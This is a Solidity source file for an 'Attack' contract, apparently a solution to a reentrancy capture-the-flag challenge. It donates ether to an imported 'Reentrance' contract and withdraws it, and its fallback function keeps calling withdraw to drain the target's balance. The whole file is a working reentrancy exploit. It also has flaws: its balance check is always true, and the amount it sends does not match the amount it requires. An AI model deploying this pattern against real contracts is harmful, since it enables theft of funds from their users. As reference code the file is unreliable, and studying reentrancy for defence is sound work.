// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '/Reentrance.sol';

    contract Attack {
        Reentrance public target;

        constructor(address payable _etherStoreAddress) {
          target = Reentrance(_etherStoreAddress);

        }

        fallback() external payable {
            if (address(target).balance >= 0){
              target.withdraw(10000 wei);
            }
        }

        function attack() external payable {
          require(msg.value >= 10000 wei);
          target.donate{value: 100000 wei, gas: 40000000}(address(this));
          target.withdraw(10000 wei);

        }

        function getBalance() public view returns (uint) {
            return address(this).balance;
        }
      
    }
